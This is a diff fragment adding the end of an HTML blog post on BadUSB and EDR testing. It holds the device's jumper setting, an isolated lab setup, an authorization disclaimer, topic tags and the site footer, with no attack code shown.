+        <li>Dev-mode jumper: GP0 (floating = armed, grounded = setup mode)</li>
+      </ul>
+
+      <p><strong>Testing Environment</strong></p>
+      <ul>
+        <li>Target: Windows 11 Home, dormant laptop, fresh "lab-man" account</li>
+        <li>Network: LAB-DETONATE VLAN (isolated from production)</li>
+        <li>EDR tested: Huntress v0.14.162</li>
+      </ul>
+
+      <p style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(255, 255, 255, 0.08); font-size: 0.9rem; color: var(--text-muted); font-style: italic;">This research was conducted in an isolated lab environment with proper authorization on systems I personally own. Nothing in this post should be used to attack systems you don't have explicit permission to test. The payload code shown is the same code published in public DuckyScript repositories — there's no novel offense here, only a structured demonstration of why this attack class continues to work.</p>
+
+      <div class="blog-tags">
+        <span class="blog-tag">physical-security</span>
+        <span class="blog-tag">badusb</span>
+        <span class="blog-tag">edr-testing</span>
+        <span class="blog-tag">red-team</span>
+        <span class="blog-tag">circuitpython</span>
+        <span class="blog-tag">raspberry-pi</span>
+        <span class="blog-tag">huntress</span>
+        <span class="blog-tag">living-off-the-land</span>
+        <span class="blog-tag">credential-harvesting</span>
+        <span class="blog-tag">vulnerability</span>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div>
+        <div style="margin-bottom: 0.5rem; font-weight: 600; color: var(--text-primary);">Dillan Valor</div>
+        <div>© <span id="year"></span> valorworks.dev · All rights reserved</div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
